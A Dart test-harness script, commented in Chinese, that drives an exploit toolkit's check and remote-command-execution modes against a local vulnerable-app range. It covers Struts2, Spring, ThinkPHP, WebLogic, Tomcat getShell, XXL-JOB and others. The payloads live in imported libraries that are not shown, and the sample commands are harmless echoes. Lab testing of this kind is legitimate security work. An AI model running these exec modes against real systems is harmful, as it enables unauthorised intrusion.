// ignore_for_file: avoid_print

/// exp 模块的靶场联调脚本（不改动 App，仅直接调用 exp 服务）。
///
/// 用法：
///   dart tool/verify/exp_live.dart php-check  http://127.0.0.1:18090
///   dart tool/verify/exp_live.dart php-exec   http://127.0.0.1:18090 'echo $HOME'
///   dart tool/verify/exp_live.dart spring-check http://127.0.0.1:18093
///   dart tool/verify/exp_live.dart spring-exec  http://127.0.0.1:18093 'echo hi'
///   dart tool/verify/exp_live.dart s2059-check  http://127.0.0.1:18091
///   dart tool/verify/exp_live.dart s2059-exec   http://127.0.0.1:18091 'echo hi'
///   dart tool/verify/exp_live.dart s2057-check  http://127.0.0.1:18092
///   dart tool/verify/exp_live.dart s2057-exec   http://127.0.0.1:18092 'echo hi'
library;

import 'dart:io';

import '../../lib/exp/vulhub/services/runtime_services.dart';
import '../../lib/exp/vulhub/services/exp_result.dart';
import '../../lib/exp/vulhub/spring_exp_service.dart';
import '../../lib/exp/vulhub/struts2_exp_service.dart';
import '../../lib/exp/thinkphp/thinkphp_exp_service.dart';
import '../../lib/exp/vulhub/services/apache_family_services.dart';
import '../../lib/exp/vulhub/services/nacos_exp_service.dart';
import '../../lib/exp/vulhub/services/web_stack_services.dart';
import '../../lib/exp/vulhub/services/xxljob_exp_service.dart';
import '../../lib/exp/shiro/shiro_exp_service.dart';

Future<void> main(List<String> args) async {
  if (args.length < 2) {
    print('usage: exp_live <case> <url> [cmd]');
    exitCode = 64;
    return;
  }
  final mode = args[0];
  final url = args[1];
  final cmd = args.length > 2 ? args[2] : 'echo MATRIX_EXP_OK';

  switch (mode) {
    case 'php-check':
      _show(await PhpBackdoorExpService(baseUrl: url).check());
      break;
    case 'php-exec':
      print(await PhpBackdoorExpService(baseUrl: url).execRce(cmd));
      break;
    case 'phpcgi-check':
      _show(await PhpCgiExpService(baseUrl: url).check());
      break;
    case 'phpcgi-exec':
      print(await PhpCgiExpService(baseUrl: url).execRce(cmd));
      break;
    case 'spring-check':
      _show(await SpringExpService(url: url).checkSpringCloudFunction());
      break;
    case 'spring-exec':
      print(await SpringExpService(url: url).execSpringCloudFunction(cmd));
      break;
    case 's2059-check':
      _show(await Struts2ExpService(url: url).checkS2059());
      break;
    case 's2059-exec':
      print(await Struts2ExpService(url: url).execS2059(cmd));
      break;
    case 's2057-check':
      _show(await Struts2ExpService(url: url).checkS2057());
      break;
    case 's2057-exec':
      print(await Struts2ExpService(url: url).execS2057(cmd));
      break;
    case 'thinkphp-check':
      final svc = ThinkphpExpService(url: url);
      final checks = <String, Future<ThinkphpResult> Function()>{
        'tp50': svc.checkTp50,
        'tp5010': svc.checkTp5010,
        'tp5022_5129': svc.checkTp5022_5129,
        'tp5023': svc.checkTp5023,
        'tp5024_5130': svc.checkTp5024_5130,
        'tp3': svc.checkTp3,
        'tp2': svc.checkTp2,
        'tp3Module': svc.checkTp3Module,
        'tp3ModuleTypo': svc.checkTp3ModuleTypo,
        'tp3LogRce': svc.checkTp3LogRce,
        'tp5023Debug': svc.checkTp5023Debug,
        'tp5ViewDisplay': svc.checkTp5ViewDisplay,
        'tp5MethodFilter': svc.checkTp5MethodFilter,
      };
      for (final e in checks.entries) {
        final r = await e.value();
        print('  ${e.key.padRight(14)} vulnerable=${r.vulnerable} '
            'failed=${r.failed} name=${r.vulnName} detail=${r.detail}');
      }
      break;
    case 'thinkphp-exec':
      final out = await ThinkphpExpService(
        url: url,
      ).exeRce(ThinkphpVulnType.tp5023, cmd);
      print(out);
      break;
    case 'tomcat-check':
      _show(await TomcatExpService(baseUrl: url).check());
      break;
    case 'tomcat-getshell':
      print(await TomcatExpService(baseUrl: url).getShell());
      break;
    case 'shiro-check':
      print('isShiro=${await ShiroExpService(url: url).checkIsShiro()}');
      break;
    case 's2005-check':
      _show(await Struts2ExpService(url: url).checkS2005());
      break;
    case 's2007-check':
      _show(await Struts2ExpService(url: url).checkS2007());
      break;
    case 's2032-check':
      _show(await Struts2ExpService(url: url).checkS2032());
      break;
    case 's2045-check':
      _show(await Struts2ExpService(url: url).checkS2045());
      break;
    case 's2052-check':
      _show(await Struts2ExpService(url: url).checkS2052());
      break;
    case 's2053-check':
      _show(await Struts2ExpService(url: url).checkS2053());
      break;
    case 's2005-exec':
      print(await Struts2ExpService(url: url).execS2005(cmd));
      break;
    case 's2032-exec':
      print(await Struts2ExpService(url: url).execS2032(cmd));
      break;
    case 's2045-exec':
      print(await Struts2ExpService(url: url).execS2045(cmd));
      break;
    case 's2053-exec':
      print(await Struts2ExpService(url: url).execS2053(cmd));
      break;
    case 'httpd-exec':
      print(await ApacheHttpdExpService(baseUrl: url).execRce(cmd));
      break;
    case 'xxljob-exec':
      print(await XxlJobExpService(baseUrl: url).execRce(cmd));
      break;
    case 'spring-4977':
      _show(await SpringExpService(url: url).checkSpringSecurityOauth());
      break;
    case 'spring-8046':
      _show(await SpringExpService(url: url).checkSpringDataRest());
      break;
    case 'spring-1273':
      _show(await SpringExpService(url: url).checkSpringDataCommons());
      break;
    case 'spring-22963':
      _show(await SpringExpService(url: url).checkSpringCloudFunction());
      break;
    case 'spring-22965':
      _show(await SpringExpService(url: url).checkSpring4Shell());
      break;
    case 'httpd-check':
      _show(await ApacheHttpdExpService(baseUrl: url).check());
      break;
    case 'drupal-check':
      _show(await DrupalExpService(baseUrl: url).check());
      break;
    case 'nacos-check':
      _show(await NacosExpService(baseUrl: url).check());
      break;
    case 'xxljob-check':
      _show(await XxlJobExpService(baseUrl: url).check());
      break;
    case 'weblogic-10271':
      _show(await WebLogicExpService(baseUrl: url).checkCve201710271());
      break;
    case 'weblogic-14882':
      _show(await WebLogicExpService(baseUrl: url).checkCve202014882());
      break;
    default:
      print('unknown case: $mode');
      exitCode = 64;
  }
}

void _show(ExpResult r) {
  print('vulnerable=${r.vulnerable} failed=${r.failed} '
      'name=${r.vulnName} detail=${r.detail}');
}
